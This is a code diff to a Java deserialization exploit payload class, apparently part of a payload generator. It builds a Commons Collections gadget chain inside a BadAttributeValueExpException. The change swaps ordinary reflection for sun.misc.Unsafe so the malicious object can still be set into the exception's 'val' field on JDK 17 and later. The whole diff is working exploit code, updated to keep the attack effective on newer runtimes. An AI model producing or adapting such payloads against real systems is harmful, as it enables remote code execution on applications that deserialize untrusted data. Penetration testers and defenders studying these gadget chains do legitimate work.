@@ -5,6 +5,8 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import sun.misc.Unsafe;
+
 import javax.management.BadAttributeValueExpException;
 
 import org.apache.commons.collections.Transformer;
@@ -82,9 +84,12 @@ public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<
         TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");
 
         BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-        Field valfield = val.getClass().getDeclaredField("val");
-        valfield.setAccessible(true);
-        valfield.set(val, entry);
+        // JDK 17+ changed val field type from Object to String — use Unsafe to bypass
+        final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+        unsafeField.setAccessible(true);
+        final Unsafe unsafe = (Unsafe) unsafeField.get(null);
+        final Field valfield = BadAttributeValueExpException.class.getDeclaredField("val");
+        unsafe.putObject(val, unsafe.objectFieldOffset(valfield), entry);
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
